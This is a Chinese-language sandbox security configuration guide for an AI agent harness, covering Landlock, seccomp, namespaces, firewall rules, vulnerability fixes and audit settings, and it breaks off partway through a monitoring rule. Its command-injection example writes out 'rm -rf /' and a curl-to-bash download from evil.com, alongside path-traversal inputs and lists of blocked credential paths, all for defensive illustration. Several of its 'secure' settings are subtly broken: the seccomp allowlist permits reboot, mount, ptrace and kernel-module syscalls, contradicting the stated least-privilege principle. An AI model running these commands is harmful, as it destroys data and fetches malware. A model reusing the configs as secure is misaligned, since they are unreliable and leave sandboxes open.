---
title: "DeepSeek Harness 沙箱安全配置指南"
tags: []
source: "baike"
source_path: "项目分析 / DSH Agent 项目分析 / 架构设计文档"
collected: "2026-09-05"
status: "imported"
---

# DeepSeek Harness 沙箱安全配置指南

## 一、安全架构概述

### 1.1 安全模型设计原则

DSH 沙箱安全模型遵循以下核心原则：

- **最小权限原则**：默认拒绝，仅授予必要的最小权限
- **纵深防御**：多层安全机制，单一防线被突破不会导致系统沦陷
- **隔离性**：不同会话、不同用户之间严格隔离
- **可审计性**：所有安全相关操作都有日志记录
- **默认安全**：配置缺失时采用最严格的安全策略

### 1.2 安全层次架构

```
┌─────────────────────────────────────────────────────┐
│                   应用层安全                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │   认证鉴权   │  │   权限控制   │  │   输入验证   │  │
│  └─────────────┘  └─────────────┘  └─────────────┘  │
└─────────────────────────────────────────────────────┘
                           │
┌─────────────────────────────────────────────────────┐
│                   运行时安全                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │   进程隔离   │  │   内存隔离   │  │   网络隔离   │  │
│  └─────────────┘  └─────────────┘  └─────────────┘  │
└─────────────────────────────────────────────────────┘
                           │
┌─────────────────────────────────────────────────────┐
│                   系统层安全                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │ 文件系统隔离 │  │   Landlock  │  │   cgroups   │  │
│  └─────────────┘  └─────────────┘  └─────────────┘  │
└─────────────────────────────────────────────────────┘
                           │
┌─────────────────────────────────────────────────────┐
│                   硬件层安全                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │   容器化     │  │   虚拟化     │  │   TPM       │  │
│  └─────────────┘  └─────────────┘  └─────────────┘  │
└─────────────────────────────────────────────────────┘
```

---

## 二、权限配置指南

### 2.1 文件系统权限配置

#### 2.1.1 基础配置

```yaml
# security.yml
filesystem:
  # 沙箱根目录
  sandbox_root: /var/dsh/sandbox
  
  # 只读挂载点
  readonly_mounts:
    - /usr/bin
    - /usr/lib
    - /lib
    - /etc/ssl
  
  # 可写挂载点
  writable_mounts:
    - path: /workspace
      max_size: 1GB
      quota_per_user: 100MB
    - path: /tmp
      max_size: 500MB
      auto_cleanup: true
  
  # 禁止访问的路径
  blocked_paths:
    - /etc/passwd
    - /etc/shadow
    - /root
    - /home/*/.ssh
    - /proc/self/mem
    - /sys/firmware
  
  # 允许的文件操作
  allowed_operations:
    - read
    - write
    - create
    - delete
  
  # 禁止的文件操作
  blocked_operations:
    - chmod
    - chown
    - symlink_to_blocked
    - hardlink_to_blocked
```

#### 2.1.2 Landlock 策略配置

```yaml
# landlock-policy.yml
landlock:
  enabled: true
  version: 2
  
  # 文件系统访问规则
  rules:
    # 工作目录：完全访问
    - path: /workspace
      access:
        - read_file
        - write_file
        - read_dir
        - make_reg
        - make_dir
        - remove_file
        - remove_dir
        - refer
        - truncate
    
    # 临时目录：限制性访问
    - path: /tmp
      access:
        - read_file
        - write_file
        - make_reg
        - remove_file
    
    # 系统目录：只读
    - path: /usr
      access:
        - read_file
        - read_dir
    
    # 配置目录：禁止访问
    - path: /etc
      access: []
  
  # 默认策略（未匹配路径）
  default_policy: deny
```

#### 2.1.3 文件系统权限代码实现

```typescript
import { Landlock } from '@deepseek-ai/node-addon-landlock-run'

export class FileSystemSandbox {
  private landlock: Landlock

  constructor(config: FileSystemConfig) {
    this.landlock = new Landlock({
      handledAccessFS: [
        'LANDLOCK_ACCESS_FS_EXECUTE',
        'LANDLOCK_ACCESS_FS_WRITE_FILE',
        'LANDLOCK_ACCESS_FS_READ_FILE',
        'LANDLOCK_ACCESS_FS_READ_DIR',
        'LANDLOCK_ACCESS_FS_REMOVE_DIR',
        'LANDLOCK_ACCESS_FS_REMOVE_FILE',
        'LANDLOCK_ACCESS_FS_MAKE_CHAR',
        'LANDLOCK_ACCESS_FS_MAKE_DIR',
        'LANDLOCK_ACCESS_FS_MAKE_REG',
        'LANDLOCK_ACCESS_FS_MAKE_SOCK',
        'LANDLOCK_ACCESS_FS_MAKE_FIFO',
        'LANDLOCK_ACCESS_FS_MAKE_BLOCK',
        'LANDLOCK_ACCESS_FS_MAKE_SYM',
        'LANDLOCK_ACCESS_FS_REFER',
        'LANDLOCK_ACCESS_FS_TRUNCATE',
      ]
    })

    this.applyRules(config.rules)
  }

  private applyRules(rules: LandlockRule[]) {
    for (const rule of rules) {
      this.landlock.addRule({
        path: rule.path,
        access: rule.access
      })
    }
    
    this.landlock.enforce()
  }

  // 检查路径访问权限
  checkAccess(path: string, operation: string): boolean {
    const resolved = this.resolvePath(path)
    
    // 检查是否在沙箱内
    if (!this.isInSandbox(resolved)) {
      return false
    }
    
    // 检查是否被阻止
    if (this.isBlocked(resolved)) {
      return false
    }
    
    // 检查操作权限
    return this.hasPermission(resolved, operation)
  }
}
```

### 2.2 进程权限配置

#### 2.2.1 进程隔离配置

```yaml
# process-isolation.yml
process:
  # 命名空间隔离
  namespaces:
    pid: true      # PID 隔离
    net: true      # 网络隔离
    mount: true    # 挂载点隔离
    uts: true      # 主机名隔离
    ipc: true      # IPC 隔离
    user: true     # 用户隔离
    cgroup: true   # cgroup 隔离
  
  # 用户映射
  user_mapping:
    inside_user: 1000
    inside_group: 1000
    outside_user: 65534  # nobody
    outside_group: 65534
  
  # 能力限制
  capabilities:
    drop:
      - CAP_SYS_ADMIN
      - CAP_SYS_PTRACE
      - CAP_NET_RAW
      - CAP_NET_ADMIN
      - CAP_SYS_MODULE
      - CAP_SYS_RAWIO
      - CAP_SYS_BOOT
      - CAP_SYS_TIME
    keep:
      - CAP_NET_BIND_SERVICE
      - CAP_CHOWN
      - CAP_SETUID
      - CAP_SETGID
  
  # Seccomp 过滤
  seccomp:
    enabled: true
    default_action: SCMP_ACT_KILL
    allowed_syscalls:
      - read
      - write
      - open
      - close
      - stat
      - fstat
      - lstat
      - poll
      - lseek
      - mmap
      - mprotect
      - munmap
      - brk
      - ioctl
      - access
      - pipe
      - select
      - sched_yield
      - mremap
      - msync
      - mincore
      - madvise
      - shmget
      - shmat
      - shmctl
      - dup
      - dup2
      - pause
      - nanosleep
      - getitimer
      - alarm
      - setitimer
      - getpid
      - sendfile
      - socket
      - connect
      - accept
      - sendto
      - recvfrom
      - sendmsg
      - recvmsg
      - shutdown
      - bind
      - listen
      - getsockname
      - getpeername
      - socketpair
      - setsockopt
      - getsockopt
      - clone
      - fork
      - vfork
      - execve
      - exit
      - wait4
      - kill
      - uname
      - semget
      - semop
      - semctl
      - shmdt
      - msgget
      - msgsnd
      - msgrcv
      - msgctl
      - fcntl
      - flock
      - fsync
      - fdatasync
      - truncate
      - ftruncate
      - getdents
      - getcwd
      - chdir
      - fchdir
      - rename
      - mkdir
      - rmdir
      - creat
      - link
      - unlink
      - symlink
      - readlink
      - chmod
      - fchmod
      - chown
      - fchown
      - lchown
      - umask
      - gettimeofday
      - getrlimit
      - getrusage
      - sysinfo
      - times
      - ptrace
      - getuid
      - syslog
      - getgid
      - setuid
      - setgid
      - geteuid
      - getegid
      - setpgid
      - getppid
      - getpgrp
      - setsid
      - setreuid
      - setregid
      - getgroups
      - setgroups
      - setresuid
      - getresuid
      - setresgid
      - getresgid
      - getpgid
      - setfsuid
      - setfsgid
      - getsid
      - capget
      - capset
      - rt_sigpending
      - rt_sigtimedwait
      - rt_sigqueueinfo
      - rt_sigsuspend
      - sigaltstack
      - utime
      - mknod
      - uselib
      - personality
      - ustat
      - statfs
      - fstatfs
      - sysfs
      - getpriority
      - setpriority
      - sched_setparam
      - sched_getparam
      - sched_setscheduler
      - sched_getscheduler
      - sched_get_priority_max
      - sched_get_priority_min
      - sched_rr_get_interval
      - mlock
      - munlock
      - mlockall
      - munlockall
      - vhangup
      - modify_ldt
      - pivot_root
      - _sysctl
      - prctl
      - arch_prctl
      - adjtimex
      - setrlimit
      - chroot
      - sync
      - acct
      - settimeofday
      - mount
      - umount2
      - swapon
      - swapoff
      - reboot
      - sethostname
      - setdomainname
      - iopl
      - ioperm
      - create_module
      - init_module
      - delete_module
      - get_kernel_syms
      - query_module
      - quotactl
      - nfsservctl
      - getpmsg
      - putpmsg
      - afs_syscall
      # ... 更多系统调用
```

#### 2.2.2 资源限制配置

```yaml
# resource-limits.yml
resources:
  # CPU 限制
  cpu:
    # CPU 配额（百分比）
    quota: 50
    # CPU 核心绑定
    cpus: "0-3"
    # 实时调度优先级
    rt_runtime: 950000
    rt_period: 1000000
  
  # 内存限制
  memory:
    # 最大内存
    limit: 2GB
    # 内存+交换空间
    swap: 4GB
    # 软限制
    soft_limit: 1GB
    # OOM 控制
    oom_control: true
    oom_score_adj: 500
  
  # PID 限制
  pids:
    limit: 100
  
  # I/O 限制
  io:
    # 读取速度限制
    read_bps: 100MB
    # 写入速度限制
    write_bps: 50MB
    # 读取 IOPS
    read_iops: 1000
    # 写入 IOPS
    write_iops: 500
  
  # 网络限制
  network:
    # 带宽限制
    bandwidth: 100Mbps
    # 连接数限制
    connections: 100
    # 允许的端口
    allowed_ports:
      - 80
      - 443
      - 8080
    # 禁止的端口
    blocked_ports:
      - 22
      - 3306
      - 5432
      - 6379
  
  # 文件描述符限制
  file_descriptors:
    soft: 1024
    hard: 4096
```

#### 2.2.3 进程隔离代码实现

```typescript
import { spawn, ChildProcess } from 'child_process'
import { Namespace, Cgroup } from '@deepseek-ai/dsh-sandbox'

export class ProcessSandbox {
  private namespace: Namespace
  private cgroup: Cgroup

  constructor(config: ProcessConfig) {
    this.namespace = new Namespace(config.namespaces)
    this.cgroup = new Cgroup(config.resources)
  }

  async spawn(command: string, args: string[], options: SpawnOptions): Promise<ChildProcess> {
    // 创建隔离环境
    const sandboxId = this.generateSandboxId()
    
    // 设置命名空间
    await this.namespace.create(sandboxId)
    
    // 设置 cgroup
    await this.cgroup.create(sandboxId, {
      cpu: options.cpu || { quota: 50000, period: 100000 },
      memory: options.memory || { limit: '2GB' },
      pids: options.pids || { limit: 100 }
    })
    
    // 设置 seccomp 过滤器
    const seccompProfile = this.createSeccompProfile(options.seccomp)
    
    // 生成进程
    const process = spawn(command, args, {
      ...options,
      // 命名空间配置
      uid: options.uid || 1000,
      gid: options.gid || 1000,
      // 环境变量
      env: this.filterEnvironment(options.env),
      // 工作目录
      cwd: options.cwd || '/workspace',
      // 标准输入输出
      stdio: options.stdio || ['pipe', 'pipe', 'pipe'],
      // 信号处理
      detached: false,
      // 安全选项
      ...(seccompProfile ? { seccompProfile } : {})
    })
    
    // 将进程加入 cgroup
    await this.cgroup.addProcess(sandboxId, process.pid)
    
    // 注册清理回调
    process.on('exit', async () => {
      await this.cleanup(sandboxId)
    })
    
    return process
  }

  private filterEnvironment(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
    const allowed = [
      'PATH',
      'HOME',
      'USER',
      'LANG',
      'LC_ALL',
      'TERM',
      'SHELL'
    ]
    
    const filtered: NodeJS.ProcessEnv = {}
    for (const key of allowed) {
      if (env[key]) {
        filtered[key] = env[key]
      }
    }
    
    return filtered
  }

  private createSeccompProfile(config?: SeccompConfig): string | null {
    if (!config?.enabled) return null
    
    const profile = {
      defaultAction: 'SCMP_ACT_KILL',
      architectures: ['SCMP_ARCH_X86_64'],
      syscalls: config.allowedSyscalls.map(name => ({
        names: [name],
        action: 'SCMP_ACT_ALLOW'
      }))
    }
    
    return JSON.stringify(profile)
  }

  private async cleanup(sandboxId: string): Promise<void> {
    await this.cgroup.destroy(sandboxId)
    await this.namespace.destroy(sandboxId)
  }
}
```

### 2.3 网络权限配置

#### 2.3.1 网络隔离配置

```yaml
# network-isolation.yml
network:
  # 网络模式
  mode: bridge  # bridge | host | none | custom
  
  # 网桥配置（bridge 模式）
  bridge:
    name: dsh-bridge
    subnet: 172.20.0.0/16
    gateway: 172.20.0.1
    ip_range: 172.20.1.0/24
  
  # DNS 配置
  dns:
    servers:
      - 8.8.8.8
      - 8.8.4.4
    search: []
    options:
      - ndots:5
      - timeout:2
      - attempts:3
  
  # 防火墙规则
  firewall:
    # 入站规则
    inbound:
      - action: allow
        protocol: tcp
        port: 8080
        source: 172.20.0.0/16
      
      - action: deny
        protocol: tcp
        port: 22
        source: 0.0.0.0/0
    
    # 出站规则
    outbound:
      - action: allow
        protocol: tcp
        port: 443
        destination: 0.0.0.0/0
      
      - action: allow
        protocol: tcp
        port: 80
        destination: 0.0.0.0/0
      
      - action: deny
        protocol: tcp
        port: 25  # SMTP
        destination: 0.0.0.0/0
      
      - action: deny
        protocol: tcp
        port: 587  # SMTP submission
        destination: 0.0.0.0/0
  
  # 带宽限制
  bandwidth:
    ingress: 100mbit
    egress: 50mbit
    burst: 10mbit
  
  # 连接限制
  connections:
    max_per_process: 100
    max_per_second: 10
    timeout: 30
  
  # 允许的域名
  allowed_domains:
    - "*.deepseek.com"
    - "*.github.com"
    - "*.npmjs.org"
    - "*.pypi.org"
  
  # 阻止的域名
  blocked_domains:
    - "*.internal.company.com"
    - "*.local"
    - "metadata.google.internal"
```

#### 2.3.2 网络权限代码实现

```typescript
import { NetworkNamespace, Iptables, TrafficControl } from '@deepseek-ai/dsh-network'

export class NetworkSandbox {
  private namespace: NetworkNamespace
  private iptables: Iptables
  private tc: TrafficControl

  constructor(config: NetworkConfig) {
    this.namespace = new NetworkNamespace(config.namespace)
    this.iptables = new Iptables(config.firewall)
    this.tc = new TrafficControl(config.bandwidth)
  }

  async createNetwork(sandboxId: string): Promise<NetworkHandle> {
    // 创建网络命名空间
    await this.namespace.create(sandboxId)
    
    // 创建 veth 对
    const veth = await this.createVethPair(sandboxId)
    
    // 配置 IP 地址
    await this.configureIPAddress(veth, sandboxId)
    
    // 配置 DNS
    await this.configureDNS(sandboxId)
    
    // 应用防火墙规则
    await this.applyFirewallRules(sandboxId)
    
    // 应用带宽限制
    await this.applyBandwidthLimit(sandboxId, veth)
    
    return {
      sandboxId,
      veth,
      cleanup: () => this.cleanup(sandboxId)
    }
  }

  private async createVethPair(sandboxId: string): Promise<VethPair> {
    const hostVeth = `veth-${sandboxId}-host`
    const sandboxVeth = `veth-${sandboxId}-sandbox`
    
    // 创建 veth 对
    await this.exec(`ip link add ${hostVeth} type veth peer name ${sandboxVeth}`)
    
    // 将 sandbox 端移入命名空间
    await this.exec(`ip link set ${sandboxVeth} netns ${sandboxId}`)
    
    // 启用 host 端
    await this.exec(`ip link set ${hostVeth} up`)
    
    return { host: hostVeth, sandbox: sandboxVeth }
  }

  private async configureIPAddress(veth: VethPair, sandboxId: string): Promise<void> {
    // 从 IP 池分配 IP
    const ip = await this.allocateIP(sandboxId)
    
    // 配置 sandbox 端 IP
    await this.exec(`ip netns exec ${sandboxId} ip addr add ${ip}/24 dev ${veth.sandbox}`)
    await this.exec(`ip netns exec ${sandboxId} ip link set ${veth.sandbox} up`)
    await this.exec(`ip netns exec ${sandboxId} ip route add default via ${this.config.gateway}`)
    
    // 配置 NAT
    await this.iptables.addRule('nat', 'POSTROUTING', `-s ${ip} -o eth0 -j MASQUERADE`)
  }

  private async applyFirewallRules(sandboxId: string): Promise<void> {
    const rules = this.config.firewall
    
    // 入站规则
    for (const rule of rules.inbound) {
      const action = rule.action === 'allow' ? 'ACCEPT' : 'DROP'
      await this.iptables.addRule('filter', 'FORWARD', 
        `-i eth0 -o veth-${sandboxId}-host -p ${rule.protocol} --dport ${rule.port} -s ${rule.source} -j ${action}`
      )
    }
    
    // 出站规则
    for (const rule of rules.outbound) {
      const action = rule.action === 'allow' ? 'ACCEPT' : 'DROP'
      await this.iptables.addRule('filter', 'FORWARD',
        `-i veth-${sandboxId}-host -o eth0 -p ${rule.protocol} --dport ${rule.port} -d ${rule.destination} -j ${action}`
      )
    }
  }

  private async applyBandwidthLimit(sandboxId: string, veth: VethPair): Promise<void> {
    // 使用 tc 限制带宽
    await this.tc.limit({
      device: veth.host,
      ingress: this.config.bandwidth.ingress,
      egress: this.config.bandwidth.egress,
      burst: this.config.bandwidth.burst
    })
  }

  private async cleanup(sandboxId: string): Promise<void> {
    await this.iptables.flushRules(sandboxId)
    await this.namespace.destroy(sandboxId)
  }
}
```

---

## 三、常见安全漏洞及修复方案

### 3.1 路径遍历漏洞

#### 3.1.1 漏洞描述

攻击者通过构造特殊的文件路径（如 `../../../etc/passwd`）访问沙箱外的敏感文件。

#### 3.1.2 漏洞示例

```typescript
// 漏洞代码
async function readFile(path: string) {
  const fullPath = join(sandboxRoot, path)
  return fs.readFile(fullPath)  // 未验证路径是否在沙箱内
}

// 攻击方式
readFile('../../../etc/passwd')  // 可以读取系统文件
```

#### 3.1.3 修复方案

```typescript
import { resolve, normalize, isAbsolute } from 'path'
import { realpath } from 'fs/promises'

export class SecurePathValidator {
  private sandboxRoot: string

  constructor(sandboxRoot: string) {
    this.sandboxRoot = resolve(sandboxRoot)
  }

  async validate(userPath: string): Promise<string> {
    // 1. 规范化路径
    const normalized = normalize(userPath)
    
    // 2. 检查是否包含路径遍历
    if (normalized.includes('..')) {
      throw new SecurityError('Path traversal detected')
    }
    
    // 3. 解析完整路径
    const fullPath = resolve(this.sandboxRoot, normalized)
    
    // 4. 验证是否在沙箱内
    if (!fullPath.startsWith(this.sandboxRoot)) {
      throw new SecurityError('Path outside sandbox')
    }
    
    // 5. 解析符号链接（防止符号链接攻击）
    try {
      const realPath = await realpath(fullPath)
      if (!realPath.startsWith(this.sandboxRoot)) {
        throw new SecurityError('Symlink points outside sandbox')
      }
      return realPath
    } catch (error) {
      if ((error as any).code === 'ENOENT') {
        // 文件不存在，返回解析后的路径
        return fullPath
      }
      throw error
    }
  }

  // 同步版本
  validateSync(userPath: string): string {
    const normalized = normalize(userPath)
    
    if (normalized.includes('..')) {
      throw new SecurityError('Path traversal detected')
    }
    
    const fullPath = resolve(this.sandboxRoot, normalized)
    
    if (!fullPath.startsWith(this.sandboxRoot)) {
      throw new SecurityError('Path outside sandbox')
    }
    
    return fullPath
  }
}

// 使用示例
const validator = new SecurePathValidator('/var/dsh/sandbox')

async function secureReadFile(userPath: string) {
  const safePath = await validator.validate(userPath)
  return fs.readFile(safePath)
}
```

#### 3.1.4 测试用例

```typescript
describe('PathValidator', () => {
  const validator = new SecurePathValidator('/var/dsh/sandbox')

  it('should allow valid paths', async () => {
    const path = await validator.validate('workspace/file.txt')
    expect(path).toBe('/var/dsh/sandbox/workspace/file.txt')
  })

  it('should block path traversal', async () => {
    await expect(validator.validate('../../../etc/passwd'))
      .rejects.toThrow('Path traversal detected')
  })

  it('should block absolute paths outside sandbox', async () => {
    await expect(validator.validate('/etc/passwd'))
      .rejects.toThrow('Path outside sandbox')
  })

  it('should block symlinks outside sandbox', async () => {
    // 创建指向沙箱外的符号链接
    await fs.symlink('/etc/passwd', '/var/dsh/sandbox/link')
    
    await expect(validator.validate('link'))
      .rejects.toThrow('Symlink points outside sandbox')
  })
})
```

### 3.2 命令注入漏洞

#### 3.2.1 漏洞描述

攻击者通过在命令参数中注入恶意代码，执行未经授权的系统命令。

#### 3.2.2 漏洞示例

```typescript
// 漏洞代码
async function executeCommand(command: string) {
  return exec(command)  // 直接执行用户输入的命令
}

// 攻击方式
executeCommand('ls; rm -rf /')  // 执行删除命令
executeCommand('$(curl http://evil.com/malware.sh | bash)')  // 下载并执行恶意脚本
```

#### 3.2.3 修复方案

```typescript
import { spawn } from 'child_process'
import { escape } from 'shell-escape'

export class CommandExecutor {
  private allowedCommands: Set<string>
  private blockedPatterns: RegExp[]

  constructor(config: CommandConfig) {
    this.allowedCommands = new Set(config.allowedCommands)
    this.blockedPatterns = config.blockedPatterns.map(p => new RegExp(p))
  }

  async execute(command: string, args: string[]): Promise<ExecutionResult> {
    // 1. 验证命令是否在白名单
    if (!this.allowedCommands.has(command)) {
      throw new SecurityError(`Command not allowed: ${command}`)
    }
    
    // 2. 验证参数
    for (const arg of args) {
      this.validateArgument(arg)
    }
    
    // 3. 转义参数
    const escapedArgs = args.map(arg => escape([arg]))
    
    // 4. 使用 spawn 而不是 exec（更安全）
    return new Promise((resolve, reject) => {
      const process = spawn(command, escapedArgs, {
        // 限制环境变量
        env: this.getSecureEnvironment(),
        // 限制工作目录
        cwd: '/workspace',
        // 不继承标准输入
        stdio: ['ignore', 'pipe', 'pipe']
      })
      
      let stdout = ''
      let stderr = ''
      
      process.stdout.on('data', (data) => {
        stdout += data.toString()
      })
      
      process.stderr.on('data', (data) => {
        stderr += data.toString()
      })
      
      process.on('close', (code) => {
        resolve({ code, stdout, stderr })
      })
      
      process.on('error', reject)
      
      // 设置超时
      setTimeout(() => {
        process.kill('SIGTERM')
        reject(new Error('Command execution timeout'))
      }, 30000)
    })
  }

  private validateArgument(arg: string): void {
    // 检查是否包含危险字符
    const dangerousPatterns = [
      /[;&|`$(){}]/,  // Shell 特殊字符
      /\.\.\//,       // 路径遍历
      /\x00/,         // 空字节
      /\n/,           // 换行符
    ]
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(arg)) {
        throw new SecurityError(`Dangerous pattern in argument: ${arg}`)
      }
    }
    
    // 检查是否匹配阻止模式
    for (const pattern of this.blockedPatterns) {
      if (pattern.test(arg)) {
        throw new SecurityError(`Blocked pattern in argument: ${arg}`)
      }
    }
  }

  private getSecureEnvironment(): NodeJS.ProcessEnv {
    return {
      PATH: '/usr/bin:/bin',
      HOME: '/workspace',
      USER: 'sandbox',
      LANG: 'en_US.UTF-8',
      TERM: 'dumb'
    }
  }
}
```

### 3.3 竞态条件漏洞

#### 3.3.1 漏洞描述

攻击者利用文件系统操作的时间窗口，在检查和使用之间修改文件，绕过安全检查。

#### 3.3.2 漏洞示例

```typescript
// 漏洞代码
async function processFile(path: string) {
  // 检查文件
  if (await isAllowed(path)) {
    // 时间窗口：攻击者可以在这里替换文件
    await sleep(100)
    // 使用文件（此时文件可能已被替换）
    return fs.readFile(path)
  }
}

// 攻击方式
// 1. 攻击者创建合法文件 /workspace/allowed.txt
// 2. 在检查通过后，快速将文件替换为 /etc/passwd 的符号链接
// 3. 程序读取了 /etc/passwd
```

#### 3.3.3 修复方案

```typescript
import { open, FileHandle } from 'fs/promises'
import { O_RDONLY, O_NOFOLLOW, O_NOCTTY } from 'constants'

export class RaceConditionSafeFileHandler {
  private sandboxRoot: string

  constructor(sandboxRoot: string) {
    this.sandboxRoot = sandboxRoot
  }

  async safeRead(filePath: string): Promise<Buffer> {
    // 1. 打开文件时使用 O_NOFOLLOW（防止符号链接攻击）
    //    和 O_NOCTTY（防止终端设备攻击）
    let fd: FileHandle
    
    try {
      fd = await open(filePath, O_RDONLY | O_NOFOLLOW | O_NOCTTY)
    } catch (error) {
      throw new SecurityError(`Failed to open file: ${(error as Error).message}`)
    }
    
    try {
      // 2. 使用文件描述符进行操作（避免 TOCTOU）
      const stat = await fd.stat()
      
      // 3. 验证文件属性
      if (!stat.isFile()) {
        throw new SecurityError('Not a regular file')
      }
      
      if (stat.nlink > 1) {
        throw new SecurityError('File has multiple hard links')
      }
      
      // 4. 读取文件内容
      const buffer = Buffer.alloc(stat.size)
      await fd.read(buffer, 0, stat.size, 0)
      
      return buffer
    } finally {
      // 5. 确保关闭文件描述符
      await fd.close()
    }
  }

  async safeWrite(filePath: string, data: Buffer): Promise<void> {
    // 1. 使用临时文件和原子操作
    const tempPath = `${filePath}.tmp.${Date.now()}`
    
    try {
      // 2. 写入临时文件
      const fd = await open(tempPath, O_WRONLY | O_CREAT | O_EXCL, 0o600)
      
      try {
        await fd.write(data)
        await fd.sync()  // 确保数据写入磁盘
      } finally {
        await fd.close()
      }
      
      // 3. 原子性重命名
      await rename(tempPath, filePath)
    } catch (error) {
      // 清理临时文件
      try {
        await unlink(tempPath)
      } catch {}
      throw error
    }
  }
}
```

### 3.4 拒绝服务攻击

#### 3.4.1 漏洞描述

攻击者通过消耗系统资源（CPU、内存、磁盘空间、文件描述符等），导致系统无法正常服务。

#### 3.4.2 漏洞示例

```typescript
// 漏洞代码：无限制的内存分配
async function processData(size: number) {
  return Buffer.alloc(size)  // 可能分配大量内存
}

// 攻击方式
processData(1024 * 1024 * 1024)  // 分配 1GB 内存

// 漏洞代码：无限制的文件创建
async function createFiles(count: number) {
  for (let i = 0; i < count; i++) {
    await fs.writeFile(`/tmp/file-${i}.txt`, 'data')
  }
}

// 攻击方式
createFiles(1000000)  // 创建大量文件
```

#### 3.4.3 修复方案

```typescript
export class ResourceLimiter {
  private config: ResourceConfig
  private usage: Map<string, number> = new Map()

  constructor(config: ResourceConfig) {
    this.config = config
  }

  // 检查内存限制
  checkMemory(bytes: number): void {
    const current = this.getUsage('memory')
    const limit = this.config.memory.max
    
    if (current + bytes > limit) {
      throw new ResourceLimitError('Memory limit exceeded')
    }
    
    this.updateUsage('memory', current + bytes)
  }

  // 检查文件大小限制
  checkFileSize(bytes: number): void {
    if (bytes > this.config.file.maxSize) {
      throw new ResourceLimitError('File size limit exceeded')
    }
  }

  // 检查文件数量限制
  checkFileCount(): void {
    const current = this.getUsage('files')
    const limit = this.config.file.maxCount
    
    if (current >= limit) {
      throw new ResourceLimitError('File count limit exceeded')
    }
    
    this.updateUsage('files', current + 1)
  }

  // 检查 CPU 时间限制
  checkCpuTime(ms: number): void {
    const current = this.getUsage('cpu')
    const limit = this.config.cpu.maxTime
    
    if (current + ms > limit) {
      throw new ResourceLimitError('CPU time limit exceeded')
    }
    
    this.updateUsage('cpu', current + ms)
  }

  // 检查并发限制
  async checkConcurrency(): Promise<void> {
    const current = this.getUsage('concurrent')
    const limit = this.config.concurrent.max
    
    if (current >= limit) {
      // 等待而不是拒绝
      await this.waitForSlot()
    }
    
    this.updateUsage('concurrent', current + 1)
  }

  releaseConcurrency(): void {
    const current = this.getUsage('concurrent')
    this.updateUsage('concurrent', Math.max(0, current - 1))
  }

  private getUsage(resource: string): number {
    return this.usage.get(resource) || 0
  }

  private updateUsage(resource: string, value: number): void {
    this.usage.set(resource, value)
  }

  private async waitForSlot(): Promise<void> {
    return new Promise((resolve) => {
      const check = () => {
        if (this.getUsage('concurrent') < this.config.concurrent.max) {
          resolve()
        } else {
          setTimeout(check, 100)
        }
      }
      check()
    })
  }
}

// 使用示例
const limiter = new ResourceLimiter({
  memory: { max: 2 * 1024 * 1024 * 1024 },  // 2GB
  file: { maxSize: 100 * 1024 * 1024, maxCount: 1000 },  // 100MB, 1000文件
  cpu: { maxTime: 60000 },  // 60秒
  concurrent: { max: 10 }
})

async function limitedReadFile(path: string) {
  const stat = await fs.stat(path)
  limiter.checkFileSize(stat.size)
  limiter.checkMemory(stat.size)
  return fs.readFile(path)
}
```

### 3.5 信息泄露漏洞

#### 3.5.1 漏洞描述

系统错误信息、调试日志或异常堆栈泄露敏感信息给攻击者。

#### 3.5.2 漏洞示例

```typescript
// 漏洞代码
app.use((err, req, res, next) => {
  // 直接返回错误详情
  res.status(500).json({
    error: err.message,
    stack: err.stack,  // 泄露堆栈信息
    config: process.env  // 泄露环境变量
  })
})
```

#### 3.5.3 修复方案

```typescript
export class SecureErrorHandler {
  private isProduction: boolean
  private logger: Logger

  constructor(config: ErrorHandlerConfig) {
    this.isProduction = config.isProduction
    this.logger = config.logger
  }

  handleError(error: Error, context?: ErrorContext): ErrorResponse {
    // 1. 记录完整错误信息（仅服务器端）
    this.logger.error('Error occurred', {
      message: error.message,
      stack: error.stack,
      context,
      timestamp: Date.now()
    })
    
    // 2. 生成错误 ID
    const errorId = this.generateErrorId()
    
    // 3. 返回安全的错误信息
    if (this.isProduction) {
      // 生产环境：返回通用错误信息
      return {
        error: 'Internal Server Error',
        errorId,
        message: 'An unexpected error occurred. Please contact support.'
      }
    } else {
      // 开发环境：返回更多细节（但仍需脱敏）
      return {
        error: error.name,
        errorId,
        message: this.sanitizeMessage(error.message),
        // 不返回堆栈和环境变量
      }
    }
  }

  private sanitizeMessage(message: string): string {
    // 移除敏感信息
    const sensitivePatterns = [
      /password[=:]\s*\S+/gi,
      /token[=:]\s*\S+/gi,
      /secret[=:]\s*\S+/gi,
      /key[=:]\s*\S+/gi,
      /\/home\/\w+/g,  // 用户目录
      /\/var\/\w+/g,   // 系统目录
    ]
    
    let sanitized = message
    for (const pattern of sensitivePatterns) {
      sanitized = sanitized.replace(pattern, '[REDACTED]')
    }
    
    return sanitized
  }

  private generateErrorId(): string {
    return `err_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
  }
}
```

---

## 四、安全审计配置

### 4.1 审计日志配置

```yaml
# audit.yml
audit:
  enabled: true
  
  # 日志存储
  storage:
    type: file  # file | database | syslog
    path: /var/log/dsh/audit.log
    rotation:
      max_size: 100MB
      max_files: 10
      compress: true
  
  # 记录的事件类型
  events:
    # 认证事件
    - auth.login
    - auth.logout
    - auth.failure
    
    # 授权事件
    - access.granted
    - access.denied
    
    # 文件操作
    - file.read
    - file.write
    - file.delete
    - file.permission_change
    
    # 进程操作
    - process.create
    - process.terminate
    - process.privilege_change
    
    # 网络操作
    - network.connect
    - network.disconnect
    - network.firewall_block
    
    # 安全事件
    - security.violation
    - security.suspicious_activity
  
  # 日志格式
  format:
    type: json
    fields:
      - timestamp
      - event_type
      - user_id
      - session_id
      - source_ip
      - resource
      - action
      - result
      - details
```

### 4.2 安全监控配置

```yaml
# security-monitoring.yml
monitoring:
  enabled: true
  
  # 告警规则
  alerts:
    # 暴力破解检测
    - name: brute_force_detection
      condition: auth.failure[user_id] > 5 in 5m
      severity: high
      action:
        - block_user
        - notify_admin
    
    # 异常文件访问
    - name: suspicious_file_access
      condition: file.read[path matches /etc/*|/root/*] > 0
      severity: high
      action:
        - block_access
        - notify_admin
    
    # 资源耗尽检测
    - name: resource_exhaustion
      condition: resource[memory] > 90% or resource[cpu] > 90%
      severity: medium
      action:
        - throttle
        - notify_admin
    
    # 网络异常
    - name: network_anomaly
